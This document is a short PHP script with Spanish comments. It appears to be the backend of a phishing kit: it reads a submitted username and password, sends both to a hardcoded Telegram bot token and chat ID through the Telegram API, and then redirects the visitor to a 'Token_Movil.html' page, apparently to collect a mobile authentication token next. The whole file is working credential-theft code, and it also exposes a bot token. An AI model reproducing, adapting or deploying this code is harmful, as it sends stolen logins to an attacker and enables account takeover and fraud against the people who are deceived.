<?php
// Obtener los datos del formulario
$usuario = $_POST['usuario'] ?? '';
$contrasena = $_POST['contrasena'] ?? '';

// Validar los datos (puedes agregar más validaciones según tus necesidades)

// Construir el mensaje a enviar al bot de Telegram
$message = "Nuevo usuario: $usuario\nContraseña: $contrasena";

// Token de tu bot de Telegram
$botToken = '7254220244:AAHb4kQ0IdVGRghwWnmIzNBZ7yDb4cZuiW4';

// ID del chat al que deseas enviar el mensaje
$chatId = '6145123951';

// URL de la API de Telegram
$telegramApiUrl = "https://api.telegram.org/bot7254220244:AAHb4kQ0IdVGRghwWnmIzNBZ7yDb4cZuiW4/sendMessage";

// Configurar los datos a enviar
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

// Inicializar cURL para hacer la solicitud a la API de Telegram
$ch = curl_init($telegramApiUrl);

// Configurar las opciones de cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

// Ejecutar la solicitud y obtener la respuesta
$response = curl_exec($ch);

// Verificar si la solicitud fue exitosa
if ($response === false) {
    // Manejar el error
    echo "Error al enviar el mensaje al bot de Telegram.";
} else {
    // Manejar el éxito
    echo "Mensaje enviado al bot de Telegram con éxito.";
    
    // Redirigir a otro sitio
    header('Location: Token_Movil.html');
    exit();
}

// Cerrar la sesión cURL
curl_close($ch);
?>
